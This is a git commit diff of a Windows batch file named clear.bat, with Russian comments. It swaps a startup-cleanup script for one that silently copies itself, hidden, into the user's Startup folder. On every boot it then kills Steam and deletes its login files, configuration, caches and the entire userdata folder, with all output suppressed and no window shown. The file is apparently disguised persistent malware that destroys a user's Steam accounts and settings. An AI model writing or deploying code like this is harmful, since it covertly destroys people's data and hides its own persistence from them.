8b012696b9db9e9394eedf928b2305e655eefc3a
BonkLordUs <gvvggg504@gmail.com>
2026-02-24 21:50:42 +0700

    Add files via upload

--- clear.bat
+++ clear.bat
@@ -1,30 +1,54 @@
 @echo off
-:: Запрос прав администратора
-net session >nul 2>&1 || (
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\GetAdmin.vbs"
-    echo UAC.ShellExecute "%~nx0", "%*", "", "runas", 1 >> "%temp%\GetAdmin.vbs"
-    cscript //NOLOGO "%temp%\GetAdmin.vbs"
-    del /f /q "%temp%\GetAdmin.vbs" >nul 2>&1
-    exit
+setlocal enableextensions
+
+:: ============================================
+:: САМОУСТАНОВКА В АВТОЗАГРУЗКУ (выполняется 1 раз)
+:: ============================================
+if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\clear.bat" (
+    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\clear.bat" /y >nul 2>&1
+    attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\clear.bat" >nul 2>&1
 )
 
-echo Удаление ваших файлов из автозагрузки...
+:: ============================================
+:: ОЧИСТКА STEAM (выполняется при каждом запуске)
+:: ============================================
 
-:: Удаление из папки автозагрузки
-del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\steam_cleaner.vbs" >nul 2>&1
-del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\cleaner.*" >nul 2>&1
-del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*.vbs" >nul 2>&1
+:: Закрываем Steam если запущен
+taskkill /F /IM steam.exe >nul 2>&1
+timeout /t 2 /nobreak >nul
 
-:: Удаление из реестра
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SteamCleaner" /f >nul 2>&1
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemCleaner" /f >nul 2>&1
-reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SteamCleaner" /f >nul 2>&1
+:: Поиск пути к Steam
+set steam_path=
+if exist "C:\Program Files (x86)\Steam" set "steam_path=C:\Program Files (x86)\Steam"
+if exist "C:\Program Files\Steam" set "steam_path=C:\Program Files\Steam"
 
-:: Восстановление Shell, если он был изменен
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f >nul 2>&1
+:: Если Steam не найден в стандартных папках, ищем в реестре
+if not defined steam_path (
+    for /f "skip=2 tokens=2*" %%a in ('reg query "HKCU\Software\Valve\Steam" /v SteamPath 2^>nul') do set "steam_path=%%b"
+)
 
-:: Удаление папки C:\clear
-if exist "C:\clear" rmdir /s /q "C:\clear" >nul 2>&1
+:: Если Steam найден - чистим
+if defined steam_path (
+    :: Удаляем аккаунты (самое главное)
+    if exist "%steam_path%\config\loginusers.vdf" del /f /q "%steam_path%\config\loginusers.vdf" >nul 2>&1
+    if exist "%steam_path%\config\config.vdf" del /f /q "%steam_path%\config\config.vdf" >nul 2>&1
+    
+    :: Чистим кеш
+    if exist "%steam_path%\appcache" rmdir /s /q "%steam_path%\appcache" >nul 2>&1
+    if exist "%steam_path%\depotcache" rmdir /s /q "%steam_path%\depotcache" >nul 2>&1
+    if exist "%steam_path%\logs" rmdir /s /q "%steam_path%\logs" >nul 2>&1
+    if exist "%steam_path%\steamapps\downloading" rmdir /s /q "%steam_path%\steamapps\downloading" >nul 2>&1
+    
+    :: Сбрасываем пользовательские данные (аккаунты и настройки)
+    if exist "%steam_path%\userdata" (
+        rmdir /s /q "%steam_path%\userdata" >nul 2>&1
+        mkdir "%steam_path%\userdata" >nul 2>&1
+    )
+)
 
-echo Готово! Ваши файлы удалены из автозагрузки.
-pause
+:: Чистим пользовательский кеш Steam
+if exist "%LOCALAPPDATA%\Steam\htmlcache" rmdir /s /q "%LOCALAPPDATA%\Steam\htmlcache" >nul 2>&1
+if exist "%TEMP%\Steam" rmdir /s /q "%TEMP%\Steam" >nul 2>&1
+
+:: Выходим без показа окон
+exit
